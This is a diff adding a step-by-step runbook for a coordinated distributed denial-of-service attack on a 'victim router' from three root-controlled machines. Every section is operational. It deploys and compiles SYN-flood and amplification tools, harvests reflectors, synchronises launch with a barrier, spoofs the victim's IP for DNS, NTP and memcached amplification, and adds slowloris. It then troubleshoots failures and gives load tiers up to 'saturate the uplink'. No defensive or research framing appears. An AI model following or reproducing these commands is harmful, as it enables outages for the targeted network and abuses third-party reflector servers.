@@ -1,0 +1,224 @@
+# RUNBOOK — from an IP to a live attack
+
+Fill the three variables at the top, then run the blocks in order.
+Nothing here is optional except where marked.
+
+```bash
+export TARGET=203.0.113.7          # the victim router
+export PORT=80                      # open port from recon
+export BOX1=198.51.100.11           # your three machines
+export BOX2=198.51.100.12
+export BOX3=198.51.100.13
+export BOXES="$BOX1 $BOX2 $BOX3"
+```
+
+---
+
+## 1. Push the kit to all three boxes
+
+```bash
+for b in $BOXES; do
+    ssh -o BatchMode=yes root@$b 'mkdir -p /root/kit'
+    scp -q ddos-kit/* root@$b:/root/kit/
+done
+echo "pushed"
+```
+
+## 2. Compile
+
+```bash
+for b in $BOXES; do
+    ssh root@$b 'cd /root/kit && gcc -O2 -pthread -o synflood synflood.c \
+        && gcc -O2 -pthread -o amplify amplify.c && echo "$(hostname) built"'
+done
+```
+
+Expected:
+```
+box1 built
+box2 built
+box3 built
+```
+
+If you see `command not found: gcc`:
+```bash
+ssh root@$b 'apt-get update -qq && apt-get install -y gcc build-essential'
+```
+
+## 3. Raise the TX ring on every NIC
+
+```bash
+for b in $BOXES; do
+    ssh root@$b 'IF=$(ip route get 1.1.1.1 | awk "{print \$5; exit}");
+                 ethtool -G $IF tx 4096 2>/dev/null;
+                 echo "$(hostname) tx=$(ethtool -g $IF 2>/dev/null | grep -A1 "Pre-set maximums" | tail -1 | tr -s " ")"'
+done
+```
+
+Skip cleanly if `ethtool` is missing — the flood still works, just at ~60% of target PPS.
+
+## 4. Recon the target (on box1)
+
+```bash
+scp -q ddos-kit/recon.sh root@$BOX1:/root/kit/
+ssh root@$BOX1 "cd /root/kit && chmod +x recon.sh && ./recon.sh $TARGET"
+```
+
+Read the `=== verdict ===` block. You need at least one `open` TCP port.
+
+**Stop here if there are no open ports.** A SYN to a filtered port allocates nothing.
+
+Copy the open port into `$PORT`.
+
+## 5. Harvest reflectors (on box1)
+
+```bash
+ssh root@$BOX1 'cd /root/kit && \
+  curl -sL https://raw.githubusercontent.com/blacklanternsecurity/bbot/main/bbot/data/dns_children.txt \
+  | grep -oE "([0-9]{1,3}\.){3}[0-9]{1,3}" | sort -u > cands.txt && \
+  wc -l cands.txt'
+
+ssh root@$BOX1 'cd /root/kit && python3 harvest.py --candidates cands.txt --out reflectors.txt'
+```
+
+You need at least ~50 kept reflectors for amplification to matter. If `kept 0`, skip amplification entirely and run SYN only.
+
+Distribute the list:
+
+```bash
+for b in $BOX2 $BOX3; do
+    scp -q root@$BOX1:/root/kit/reflectors.txt root@$b:/root/kit/ 2>/dev/null || \
+    ssh root@$BOX1 "cat /root/kit/reflectors.txt" | ssh root@$b "cat > /root/kit/reflectors.txt"
+done
+```
+
+## 6. Smoke test — one second of SYN per box
+
+```bash
+for b in $BOXES; do
+    ssh root@$b "cd /root/kit && timeout 2 ./synflood $TARGET $PORT 2 5000"
+done
+```
+
+Expect one or two lines of `[synflood] ... pps`.
+
+- `Operation not permitted` → not root.
+- `0 pps` → raw socket path broken, usually a container missing `CAP_NET_RAW`.
+- Fine → proceed.
+
+## 7. Start the barrier
+
+```bash
+# terminal on your laptop, stays open
+python3 ddos-kit/barrier.py serve --port 9911 --count 3 --lead 2
+```
+
+It prints `listening on :9911 waiting for 3 boxes` and blocks.
+
+## 8. Arm all three boxes
+
+Run this **once per box**, from three SSH sessions, or as one loop.
+
+```bash
+# box1
+ssh root@$BOX1 "cd /root/kit && \
+  nohup python3 barrier.py wait --host $BOX1 --port 9911 -- \
+    ./synflood $TARGET $PORT 4 45000 > /root/kit/syn.log 2>&1 & \
+  nohup python3 barrier.py wait --host $BOX1 --port 9911 -- \
+    ./amplify dns reflectors.txt $TARGET 18000 > /root/kit/amp.log 2>&1 & \
+  nohup python3 barrier.py wait --host $BOX1 --port 9911 -- \
+    python3 slowloris.py $TARGET $PORT 800 > /root/kit/loris.log 2>&1 & \
+  disown; echo armed"
+
+# box2 — amplify ntp
+# box3 — amplify memcached
+```
+
+The moment the third `wait` connects, the coordinator prints `released 3 boxes`
+and all nine processes fire together.
+
+## 9. Verify inside the first 10 seconds
+
+```bash
+for b in $BOXES; do
+    echo "--- $b ---"
+    ssh root@$b 'tail -n 2 /root/kit/syn.log; tail -n 1 /root/kit/amp.log;
+                 pgrep -c -f slowloris'
+done
+```
+
+Healthy:
+
+```
+--- 198.51.100.11 ---
+[synflood]    44877 pps       8 err  total 89979
+[amplify]     17992 pps       3 err  total 36001
+800
+```
+
+## 10. Confirm spoofing survives your ISP
+
+```bash
+ssh root@$BOX1 "timeout 4 tcpdump -ni \$(ip route get 1.1.1.1 | awk '{print \$5; exit}') \
+  -c 8 'udp and dst port 53'"
+```
+
+You must see the **victim's** IP as the source:
+
+```
+IP 203.0.113.7.54321 > 8.8.8.8.53: ...
+```
+
+If you see your own box IP instead, your provider rewrites source addresses.
+Amplification is dead — kill it and run `synflood` only, at a higher rate.
+
+## 11. Watch the target
+
+```bash
+ping -c 30 -i 0.3 $TARGET
+nmap -Pn -p $PORT $TARGET
+curl -m 3 -o /dev/null -w '%{http_code} %{time_total}\n' http://$TARGET/
+```
+
+Collapse signature: ping loss climbing to 100%, nmap reports `filtered`,
+curl returns `000` with `time_total` at the timeout ceiling.
+
+## 12. Stop
+
+```bash
+for b in $BOXES; do
+    ssh root@$b 'pkill -f synflood; pkill -f amplify; pkill -9 -f slowloris;
+                 pkill -f "barrier.py wait"; echo "$(hostname) stopped"'
+done
+```
+
+`slowloris` needs `-9` — it ignores plain TERM while sockets are open.
+
+---
+
+## Failure table
+
+| symptom | cause | fix |
+|---|---|---|
+| `0 pps` on synflood | not root / no CAP_NET_RAW | run as root, or `setcap cap_net_raw+ep ./synflood` |
+| PPS at 60% of target | TX ring too small | `ethtool -G $IF tx 4096` |
+| `err` counter climbing | uplink saturated | lower `pps`, or split across more boxes |
+| `no reflectors loaded` | harvest kept nothing | re-harvest, or run SYN only |
+| amp sends but victim unaffected | provider rewrites source IP | SYN-only mode |
+| target stays up after 60s | port was filtered, SYN never landed | re-run recon, pick an open port |
+| barrier times out | one box cannot reach `$BOX1:9911` | open the port, or run the coordinator on the box all three can reach |
+| victim recovers in <20s | watchdog reboot | sustained mode, not a single burst |
+
+---
+
+## Load tiers
+
+| goal | syn pps/box | amp pps/box | loris/box |
+|---|---|---|---|
+| noise the link | 10,000 | 0 | 200 |
+| fill conntrack | 30,000 | 10,000 | 500 |
+| drop the router | 45,000 | 18,000 | 800 |
+| saturate the uplink | 60,000 | 30,000 | 1,000 |
+
+Start one tier below what you think you need. Pushing past what the uplink
+carries only produces `err` counters and NIC drops, not more damage.
